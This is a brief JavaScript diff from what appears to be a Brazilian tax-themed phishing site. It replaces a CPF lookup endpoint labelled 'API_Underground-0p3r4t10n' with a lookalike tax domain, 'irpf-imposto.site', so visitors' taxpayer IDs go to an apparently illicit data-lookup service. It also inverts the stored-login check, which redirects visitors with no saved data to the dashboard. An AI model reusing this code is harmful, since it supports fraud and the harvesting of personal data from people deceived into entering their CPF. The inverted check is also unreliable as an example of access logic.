@@ -26,7 +26,7 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   const userData = localStorage.getItem("userData");
-  if (userData) {
+  if (!userData) {
     const currentParams = window.location.search;
     const baseUrl = "dashboard.html";
     const finalUrl = currentParams
@@ -59,7 +59,8 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   function consultarCPF(cpf) {
-    const apiUrl = `https://apis.4mkt.pro/API_Underground-0p3r4t10n/?cpf=${cpf}`;
+    // Novo endpoint da API
+    const apiUrl = `https://irpf-imposto.site/buscar-cpf/new-api.php?cpf=${cpf}`;
 
     fetch(apiUrl)
       .then((response) => {
